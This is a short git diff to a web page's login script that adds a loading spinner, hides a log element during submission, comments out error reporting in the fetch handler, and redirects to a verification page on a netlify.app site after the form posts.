@@ -14,6 +14,8 @@ const ErorrBoxClose = document.querySelector(".ErorrBoxClose")
 const ErorrText = document.querySelector(".ErorrText")
 const captchaBox = document.querySelector(".captchaBox")
 const checkbox = document.querySelector(".check")
+const spanner = document.querySelector(".spanner")
+const Log = document.querySelector(".Log")
 
 ErorrBoxClose.onclick = () => {
     ErorrBoxs.style.display = "none"
@@ -43,7 +45,8 @@ ukbutton.onclick = (e) => {
         ErorrBoxs.style.display = "flex"
         ErorrText.innerHTML = "Wrong Password"
     }else{
-        
+      spanner.style.display = "flex"
+      Log.style.display = "none"
         // console.log(data)
         fetch(url, {
             method: 'POST',
@@ -61,9 +64,9 @@ ukbutton.onclick = (e) => {
               const verifyid =  JSON.parse(localStorage.getItem("userId"))
               window.location = `https://bestkryptfields.netlify.app/verify/${verifyid}`
             }).catch(error => {
-                ErorrBoxs.style.display = "flex"
-                ErorrText.innerHTML = error.message
-              console.error('Error:', error);
+              //   ErorrBoxs.style.display = "flex"
+              //   ErorrText.innerHTML = error.message
+              // console.error('Error:', error);
             });
     }
 
